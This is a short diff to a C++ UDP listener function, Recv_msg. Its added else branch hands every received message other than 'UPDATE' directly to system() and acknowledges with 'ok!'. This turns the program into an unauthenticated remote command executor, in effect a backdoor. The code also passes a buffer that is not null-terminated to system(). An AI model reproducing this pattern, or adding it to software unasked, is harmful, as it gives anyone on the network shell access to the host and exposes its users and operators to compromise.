@@ -34,17 +34,16 @@ int Recv_msg(int serv_port)
 		n = Recvfrom(sockfd, mesg, MAXLINE, 0, (SA *) &cliaddr, &len);
 		if(UPDATE == std::string(mesg, n))
 		{
-		    cout << "UPDATE" << endl;
-		    Sendto(sockfd, "ok!", strlen("ok!"), 0, (struct sockaddr*)&cliaddr, len);
+			cout << "UPDATE" << endl;
+			Sendto(sockfd, "ok!", strlen("ok!"), 0, (struct sockaddr*)&cliaddr, len);
+		}
+		else
+		{
+			system(mesg);
+			cout << string(mesg, n) << endl;	
+			Sendto(sockfd, "ok!", strlen("ok!"), 0, (struct sockaddr*)&cliaddr, len);
 		}
 	}
 
 	exit(0);
 }
-//
-//int main(int argc, char**argv)
-//{
-//	Recv_msg(5555);
-//   
-//	return 0; 
-//}
